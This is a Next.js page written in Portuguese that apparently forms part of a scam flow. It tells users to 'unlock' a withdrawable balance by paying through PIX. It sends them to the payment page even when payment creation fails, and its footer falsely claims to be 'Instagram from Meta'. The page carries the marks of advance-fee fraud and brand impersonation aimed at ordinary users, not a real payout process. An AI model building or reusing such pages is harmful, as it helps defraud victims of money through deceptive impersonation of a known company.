'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'

export default function WithdrawPage() {
  const [loading, setLoading] = useState(false)
  const router = useRouter()

  const handleUnlockSaque = async () => {
    try {
      setLoading(true)
      console.log("[v0] Starting PIX payment creation from withdraw page")
      
      // Criar transação PIX
      const response = await fetch('/api/pix-payment/create', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          transferId: `withdraw-${Date.now()}`
        }),
      })

      const result = await response.json()

      if (result.success && result.data?.id) {
        console.log("[v0] PIX transaction created successfully:", result.data)
        // Redirecionar para a nova página de pagamento PIX
        router.push(`/pix-payment?id=${result.data.id}`)
      } else {
        console.error("[v0] Error creating PIX transaction:", result)
        // Em caso de erro, ainda redireciona mas com um ID de emergência
        const emergencyId = `emergency-${Date.now()}`
        console.log("[v0] Using emergency fallback ID:", emergencyId)
        router.push(`/pix-payment?id=${emergencyId}`)
      }
    } catch (error) {
      console.error("[v0] Error in handleUnlockSaque:", error)
      // Em caso de erro, ainda redireciona mas com um ID de emergência
      const emergencyId = `emergency-${Date.now()}`
      console.log("[v0] Using emergency fallback ID:", emergencyId)
      router.push(`/pix-payment?id=${emergencyId}`)
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-100 to-orange-100 flex items-center justify-center p-4">
      <div className="bg-white rounded-3xl shadow-2xl p-8 max-w-md w-full">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-gradient-to-r from-pink-500 to-orange-500 rounded-2xl flex items-center justify-center mx-auto mb-4">
            <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
          </div>
          <h1 className="text-2xl font-bold text-gray-800 mb-2">DESBLOQUEIO DE SALDO</h1>
          <p className="text-gray-600">Veja como liberar seu saque assistindo ao vídeo</p>
        </div>

        {/* Video Placeholder */}
        <div className="bg-gray-100 rounded-2xl p-8 mb-6 aspect-video flex items-center justify-center">
          <div className="text-center">
            <div className="w-16 h-16 bg-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M8 5v14l11-7z"/>
              </svg>
            </div>
            <p className="text-gray-600 font-medium">Vídeo Tutorial</p>
            <p className="text-sm text-gray-500">Como desbloquear seu saldo</p>
          </div>
        </div>

        {/* Action Button */}
        <button
          onClick={handleUnlockSaque}
          disabled={loading}
          className={`w-full py-4 rounded-xl font-bold text-lg transition-all ${
            loading
              ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
              : 'bg-gradient-to-r from-pink-500 to-orange-500 text-white hover:shadow-lg transform hover:scale-105'
          }`}
        >
          {loading ? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
              Processando...
            </div>
          ) : (
            'DESBLOQUEAR SAQUE'
          )}
        </button>

        {/* Footer */}
        <div className="text-center mt-8 pt-6 border-t border-gray-100">
          <p className="text-xs text-gray-500">
            Todos os direitos reservados © 2025 Instagram from Meta
          </p>
        </div>
      </div>
    </div>
  )
}
